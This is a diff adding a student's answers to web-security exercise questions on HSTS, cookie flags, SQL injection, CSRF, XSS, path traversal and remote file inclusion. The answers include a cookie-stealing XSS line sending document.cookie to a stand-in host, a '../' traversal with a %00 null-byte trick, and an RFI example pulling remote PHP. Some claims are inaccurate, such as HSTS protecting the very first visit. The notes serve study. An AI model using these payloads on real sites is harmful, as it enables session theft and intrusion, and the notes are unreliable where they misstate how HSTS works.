@@ -11,7 +11,11 @@ HSTS stands for **HTTP Strict Transport Security** and tells the browser to only
 * ![FacebookHSTS](img/facebook_hsts.PNG)
 
 
-### Cookies - Secure/HttpOnly: 
+### Cookies: Secure and HttpOnly Flags: 
+
+* Secure cookies are only ever sent over encrypted HTTPS connections. Encrypting the cookie itself, when it is sent over HTTP is pointless. Attackers can smiply replay a stolen encrypted cookie. **Protects against eavesdropping**.
+* HttpOnly cookies can only be accessed over HTTP(S) and are not available to any other APIs. Therefore, they are inaccessible to scripts. **Protects against client-side scripts**
+* HttpOnly Flag can be used to prevent XSS attacks for stealing cookies. Even if the HttpOnly Flag is set, it is still possible to steal a cookie from the user without breaking the TLS tunnel. Simply by letting the user request the attacker's website mafia.org and redirect him to the original page. Then the attacker can steal the cookie from the unencrypted http request.
 
 
 
@@ -25,22 +29,22 @@ HSTS stands for **HTTP Strict Transport Security** and tells the browser to only
 
 2. How does HSTS work? Also try to explain what attacks HSTS tries to prevent and how.
 
-	* Answer
+	* HSTS stands for HTTP Strict Transport Security and can be useful to prevent MitM-attacks which are using SSL stripping. In contrast to a simple redirect by the server which indicates to the browser that it should use the https variant of the website instead of the http version, HSTS means that HTTP requests by the user will be turned into HTTPS requests. HSTS works on the very first visit of a website and is not using redirects. Therefore the first HTTP request never happens.
 
 
 3. What is the difference between a normal and a blind SQL injection?
 
-	* Answer
+	* Blind SQL injection: a SQL injection where not the response itself is interesting, but the type of the response, or lack of response, leaks information to an attacker
 
 
 4. Is CSRF abusing the trust of a website in the user or the trust of the client/user in the website? Elaborate your answer.
 
-	* Answer
+	* XSS exploits the trust a user has for a particular site. CSRF exploits the trust that a site has in a user's browser.
 
 
 5. XSS attacks also use CSRF from time to time.	Draft an example of a XSS attack where CSRF is not used en an example of a XSS attack where CSRF is used as well.
 
-	* Answer
+	* XSS: Attacker injects a script into a website which executes which the victim's access rights in the victim's browser. Stealing victim's cookie with window.open("http://magia.org/steal.php?cookie=" + document.cookie); XSS attacks: reflected/non-persistent, stored/persistent, dom-based. XSS is a special form of HTML injection. Same-Origin-Policy restricts some interactions but does not really prevent this (prevents scripts access in iframes). XSP(Content security Policy) in HTML5 which uses whitelists of scripts could help.
 
 
 6. 
@@ -71,9 +75,10 @@ HSTS stands for **HTTP Strict Transport Security** and tells the browser to only
 
 8.  * a) What is a path traversal a.k.a file name injection attack?
 
-		* Answer
+		* A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).
+		This attack is also known as “dot-dot-slash”, “directory traversal”, “directory climbing” and “backtracking”. It is also possible to use path traversal attack to execute a DoS attack by opening special files like "/var/spool/printer" which are not meant to be opened for reading, only for writing. Obviours places to look out for are URLs which include a file name as parameter: "http:/somesite.com/get-files.php?file=../admin.cfg". Trick to end the concatenation of a string for this area: using the NULL character "%00"
 
-	* b) Name at least 10 counter measures against this kind of attacks and also explain how it works.
+	* b) Name at least 10 counter measures against this kind of attacks and also explain how it works. 
 
 		* Answer
 
@@ -86,7 +91,7 @@ HSTS stands for **HTTP Strict Transport Security** and tells the browser to only
 
 10. How does a Remote File Inclusion attack work against a PHP web application?
 
-	* Answer
+	* Remote File Inclusion (RFI) allows an attacker to run arbitrary code on a server. For example including "http://mafia.com/function.php" as an option to some input on a website. If that does not work and the server disallows remote file inclusion then the attacker can still tryo Local File Inclusion (LFI) which executes scripts located on the server. The attacker could upload his own PHP code hidden as a profile picture and then point to his picture. The Null character trick can be helpful if the name of the script is hardcoded and should be excluded from the concatenation.
 
 
 11. Assume someone has no Facebook-account. Is it possible that there is still a privacy risk where information is leaking towards Facebook?
